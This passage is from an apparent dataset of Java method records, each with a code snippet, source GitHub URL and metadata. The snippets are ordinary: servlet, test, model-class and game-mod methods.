"class_name": "ComputerActualBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Computer", "snippet": "    public Computer AssembleComputer() {\n        return computer;\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerActualBuilder.java", "stars": "2", "class_props": {"extends": "ComputerBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30230, "method_name": "doGet", "class_name": "CountServlet", "params": ["HttpServletRequest", "HttpServletResponse"], "throws": ["IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n\n        ServletContext servletContext = request.getServletContext();\n        Integer count = (Integer) servletContext.getAttribute(\"count\");\n        if (count == null) {\n            count = 1;\n        } else {\n            count++;\n        }\n        response.setContentType(\"text/html\");\n        response.setCharacterEncoding(\"utf-8\");\n\n        PrintWriter out = response.getWriter();\n        out.write(\"<p>\u672c\u7f51\u9875\u5df2\u88ab\u8bbf\u95ee\uff1a\" + count + \"\u6b21</p>\");\n        servletContext.setAttribute( \"count\",  count);\n\n    }", "url": "https://raw.githubusercontent.com/Nightnessss/web-homework/master/homework01/src/com/fehead/CountServlet.java", "stars": "4", "class_props": {"extends": "HttpServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30231, "method_name": "setup", "class_name": "AuditControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {\n        MockitoAnnotations.initMocks(this);\n        AuditEventService auditEventService =\n            new AuditEventService(auditEventRepository, auditEventConverter, jhipsterProperties);\n        AuditController auditController = new AuditController(auditEventService);\n        this.restAuditMockMvc = MockMvcBuilders.standaloneSetup(auditController)\n            .setCustomArgumentResolvers(pageableArgumentResolver)\n            .setConversionService(formattingConversionService)\n            .setMessageConverters(jacksonMessageConverter).build();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30232, "method_name": "initTest", "class_name": "AuditControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initTest() {\n        auditEventRepository.deleteAll();\n        auditEvent = new PersistentAuditEvent();\n        auditEvent.setAuditEventType(SAMPLE_TYPE);\n        auditEvent.setPrincipal(SAMPLE_PRINCIPAL);\n        auditEvent.setAuditEventDate(SAMPLE_TIMESTAMP);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30233, "method_name": "getAllAudits", "class_name": "AuditControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllAudits() throws Exception {\n        // Initialize the database\n        auditEventRepository.saveAndFlush(auditEvent);\n\n        // Get all the audits\n        restAuditMockMvc.perform(get(\"/management/audits\"))\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.[*].principal\").value(hasItem(SAMPLE_PRINCIPAL)));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30234, "method_name": "getAudit", "class_name": "AuditControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAudit() throws Exception {\n        // Initialize the database\n        auditEventRepository.saveAndFlush(auditEvent);\n\n        // Get the audit\n        restAuditMockMvc.perform(get(\"/management/audits/{id}\", auditEvent.getId()))\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.principal\").value(SAMPLE_PRINCIPAL));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30235, "method_name": "getAuditsByDate", "class_name": "AuditControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAuditsByDate() throws Exception {\n        // Initialize the database\n        auditEventRepository.saveAndFlush(auditEvent);\n\n        // Generate dates for selecting audits by date, making sure the period will contain the audit\n        String fromDate = SAMPLE_TIMESTAMP.minusSeconds(SECONDS_PER_DAY).toString().substring(0, 10);\n        String toDate = SAMPLE_TIMESTAMP.plusSeconds(SECONDS_PER_DAY).toString().substring(0, 10);\n\n        // Get the audit\n        restAuditMockMvc.perform(get(\"/management/audits?fromDate=\" + fromDate + \"&toDate=\" + toDate))\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.[*].principal\").value(hasItem(SAMPLE_PRINCIPAL)));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30236, "method_name": "getNonExistingAuditsByDate", "class_name": "AuditControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getNonExistingAuditsByDate() throws Exception {\n        // Initialize the database\n        auditEventRepository.saveAndFlush(auditEvent);\n\n        // Generate dates for selecting audits by date, making sure the period will not contain the sample audit\n        String fromDate = SAMPLE_TIMESTAMP.minusSeconds(2 * SECONDS_PER_DAY).toString().substring(0, 10);\n        String toDate = SAMPLE_TIMESTAMP.minusSeconds(SECONDS_PER_DAY).toString().substring(0, 10);\n\n        // Query audits but expect no results\n        restAuditMockMvc.perform(get(\"/management/audits?fromDate=\" + fromDate + \"&toDate=\" + toDate))\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(header().string(\"X-Total-Count\", \"0\"));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30237, "method_name": "getNonExistingAudit", "class_name": "AuditControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getNonExistingAudit() throws Exception {\n        // Get the audit\n        restAuditMockMvc.perform(get(\"/management/audits/{id}\", Long.MAX_VALUE))\n            .andExpect(status().isNotFound());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30238, "method_name": "testPersistentAuditEventEquals", "class_name": "AuditControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testPersistentAuditEventEquals() {\n        PersistentAuditEvent auditEvent1 = new PersistentAuditEvent();\n        auditEvent1.setId(1L);\n        PersistentAuditEvent auditEvent2 = new PersistentAuditEvent();\n        auditEvent2.setId(auditEvent1.getId());\n        assertThat(auditEvent1).isEqualTo(auditEvent2);\n        auditEvent2.setId(2L);\n        assertThat(auditEvent1).isNotEqualTo(auditEvent2);\n        auditEvent1.setId(null);\n        assertThat(auditEvent1).isNotEqualTo(auditEvent2);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/AuditControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30239, "method_name": "applyDefaultValueOnAnnotationMapper", "class_name": "AnnotationMapperTest", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void applyDefaultValueOnAnnotationMapper() throws IOException {\n\n    Properties props = new Properties();\n    props.setProperty(PropertyParser.KEY_ENABLE_DEFAULT_VALUE, \"true\");\n\n    Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/global_variables_defaults/mybatis-config.xml\");\n    SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, props);\n    Configuration configuration = factory.getConfiguration();\n    configuration.addMapper(AnnotationMapper.class);\n    SupportClasses.CustomCache cache = SupportClasses.Utils.unwrap(configuration.getCache(AnnotationMapper.class.getName()));\n\n    Assertions.assertThat(cache.getName()).isEqualTo(\"default\");\n\n    try (SqlSession sqlSession = factory.openSession()) {\n      AnnotationMapper mapper = sqlSession.getMapper(AnnotationMapper.class);\n\n      Assertions.assertThat(mapper.ping()).isEqualTo(\"Hello\");\n    }\n\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/global_variables_defaults/AnnotationMapperTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30240, "method_name": "applyPropertyValueOnAnnotationMapper", "class_name": "AnnotationMapperTest", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void applyPropertyValueOnAnnotationMapper() throws IOException {\n\n    Properties props = new Properties();\n    props.setProperty(PropertyParser.KEY_ENABLE_DEFAULT_VALUE, \"true\");\n    props.setProperty(\"ping.sql\", \"SELECT 'Hi' FROM INFORMATION_SCHEMA.SYSTEM_USERS\");\n    props.setProperty(\"cache.name\", \"custom\");\n\n    Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/global_variables_defaults/mybatis-config.xml\");\n    SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, props);\n    Configuration configuration = factory.getConfiguration();\n    configuration.addMapper(AnnotationMapper.class);\n    SupportClasses.CustomCache cache = SupportClasses.Utils.unwrap(configuration.getCache(AnnotationMapper.class.getName()));\n\n    Assertions.assertThat(cache.getName()).isEqualTo(\"custom\");\n\n    try (SqlSession sqlSession = factory.openSession()) {\n      AnnotationMapper mapper = sqlSession.getMapper(AnnotationMapper.class);\n\n      Assertions.assertThat(mapper.ping()).isEqualTo(\"Hi\");\n    }\n\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/global_variables_defaults/AnnotationMapperTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30241, "method_name": "getId", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30242, "method_name": "setId", "class_name": "UserModel", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30243, "method_name": "getName", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30244, "method_name": "setName", "class_name": "UserModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30245, "method_name": "getGender", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Byte", "snippet": "    public Byte getGender() {\n        return gender;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30246, "method_name": "setGender", "class_name": "UserModel", "params": ["Byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGender(Byte gender) {\n        this.gender = gender;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30247, "method_name": "getAge", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getAge() {\n        return age;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30248, "method_name": "setAge", "class_name": "UserModel", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAge(Integer age) {\n        this.age = age;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30249, "method_name": "getTelphone", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTelphone() {\n        return telphone;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30250, "method_name": "setTelphone", "class_name": "UserModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTelphone(String telphone) {\n        this.telphone = telphone;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30251, "method_name": "getRegisitMode", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getRegisitMode() {\n        return regisitMode;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30252, "method_name": "setRegisitMode", "class_name": "UserModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRegisitMode(String regisitMode) {\n        this.regisitMode = regisitMode;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30253, "method_name": "getThirdPartyId", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getThirdPartyId() {\n        return thirdPartyId;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30254, "method_name": "setThirdPartyId", "class_name": "UserModel", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setThirdPartyId(Integer thirdPartyId) {\n        this.thirdPartyId = thirdPartyId;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30255, "method_name": "getEncrptPassword", "class_name": "UserModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getEncrptPassword() {\n        return encrptPassword;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30256, "method_name": "setEncrptPassword", "class_name": "UserModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEncrptPassword(String encrptPassword) {\n        this.encrptPassword = encrptPassword;\n    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/service/model/UserModel.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30257, "method_name": "processBefore", "class_name": "NoKeyGenerator", "params": ["Executor", "MappedStatement", "Statement", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void processBefore(Executor executor, MappedStatement ms, Statement stmt, Object parameter) {\n    // Do Nothing\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/NoKeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 30258, "method_name": "processAfter", "class_name": "NoKeyGenerator", "params": ["Executor", "MappedStatement", "Statement", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void processAfter(Executor executor, MappedStatement ms, Statement stmt, Object parameter) {\n    // Do Nothing\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/keygen/NoKeyGenerator.java", "stars": "15", "class_props": {"extends": null, "implements": ["KeyGenerator"], "modifiers": ["public"]}}, {"id": 30259, "method_name": "getDescricao", "class_name": "OrdemServicoInput", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getDescricao() {\n\t\treturn descricao;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/api/model/OrdemServicoInput.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30260, "method_name": "setDescricao", "class_name": "OrdemServicoInput", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDescricao(String descricao) {\n\t\tthis.descricao = descricao;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/api/model/OrdemServicoInput.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30261, "method_name": "getPreco", "class_name": "OrdemServicoInput", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getPreco() {\n\t\treturn preco;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/api/model/OrdemServicoInput.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30262, "method_name": "setPreco", "class_name": "OrdemServicoInput", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPreco(BigDecimal preco) {\n\t\tthis.preco = preco;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/api/model/OrdemServicoInput.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30263, "method_name": "getCliente", "class_name": "OrdemServicoInput", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ClienteIdInput", "snippet": "\tpublic ClienteIdInput getCliente() {\n\t\treturn cliente;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/api/model/OrdemServicoInput.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30264, "method_name": "setCliente", "class_name": "OrdemServicoInput", "params": ["ClienteIdInput"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCliente(ClienteIdInput cliente) {\n\t\tthis.cliente = cliente;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/api/model/OrdemServicoInput.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30265, "method_name": "executeProcedure", "class_name": "SyringaExplosionProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\n\t\tif (dependencies.get(\"x\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency x for procedure SyringaExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"y\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency y for procedure SyringaExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"z\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency z for procedure SyringaExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"world\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency world for procedure SyringaExplosion!\");\n\t\t\treturn;\n\t\t}\n\t\tint x = (int) dependencies.get(\"x\");\n\t\tint y = (int) dependencies.get(\"y\");\n\t\tint z = (int) dependencies.get(\"z\");\n\t\tWorld world = (World) dependencies.get(\"world\");\n\t\tif (!world.isRemote) {\n\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(SyringaBlock.block, (int) (1)));\n\t\t\tentityToSpawn.setPickupDelay(10);\n\t\t\tworld.addEntity(entityToSpawn);\n\t\t}\n\t\tif (!world.isRemote) {\n\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(Items.FLOWER_POT, (int) (1)));\n\t\t\tentityToSpawn.setPickupDelay(10);\n\t\t\tworld.addEntity(entityToSpawn);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/SyringaExplosionProcedure.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 30266, "method_name": "main", "class_name": "Demo06Stream_limit", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u83b7\u53d6\u4e00\u4e2aStream\u6d41\n        String[] arr = {\"\u7f8e\u7f8a\u7f8a\",\"\u559c\u6d0b\u6d0b\",\"\u61d2\u6d0b\u6d0b\",\"\u7070\u592a\u72fc\",\"\u7ea2\u592a\u72fc\"};\n        Stream<String> stream = Stream.of(arr);\n        //\u4f7f\u7528limit\u5bf9Stream\u6d41\u4e2d\u7684\u5143\u7d20\u8fdb\u884c\u622a\u53d6,\u53ea\u8981\u524d3\u4e2a\u5143\u7d20\n        Stream<String> stream2 = stream.limit(3);\n        //\u904d\u5386stream2\u6d41\n        stream2.forEach(name-> System.out.println(name));\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo02/Stream/Demo06Stream_limit.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30267, "method_name": "writeToParcel", "class_name": "BleDevice", "params": ["Parcel", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeToParcel(Parcel dest, int flags) {\n        dest.writeParcelable(mDevice, flags);\n        dest.writeByteArray(mScanRecord);\n        dest.writeInt(mRssi);\n        dest.writeLong(mTimestampNanos);\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30268, "method_name": "describeContents", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int describeContents() {\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30269, "method_name": "getName", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        if (mDevice != null)\n            return mDevice.getName();\n        return null;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30270, "method_name": "getMac", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMac() {\n        if (mDevice != null)\n            return mDevice.getAddress();\n        return null;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30271, "method_name": "getKey", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getKey() {\n        if (mDevice != null)\n            return mDevice.getName() + mDevice.getAddress();\n        return \"\";\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30272, "method_name": "getDevice", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BluetoothDevice", "snippet": "    public BluetoothDevice getDevice() {\n        return mDevice;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30273, "method_name": "setDevice", "class_name": "BleDevice", "params": ["BluetoothDevice"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDevice(BluetoothDevice device) {\n        this.mDevice = device;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30274, "method_name": "getScanRecord", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] getScanRecord() {\n        return mScanRecord;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30275, "method_name": "setScanRecord", "class_name": "BleDevice", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setScanRecord(byte[] scanRecord) {\n        this.mScanRecord = scanRecord;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30276, "method_name": "getRssi", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getRssi() {\n        return mRssi;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30277, "method_name": "setRssi", "class_name": "BleDevice", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRssi(int rssi) {\n        this.mRssi = rssi;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30278, "method_name": "getTimestampNanos", "class_name": "BleDevice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getTimestampNanos() {\n        return mTimestampNanos;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30279, "method_name": "setTimestampNanos", "class_name": "BleDevice", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTimestampNanos(long timestampNanos) {\n        this.mTimestampNanos = timestampNanos;\n    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/data/BleDevice.java", "stars": "2", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 30280, "method_name": "initElements", "class_name": "OakTanBarkBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": 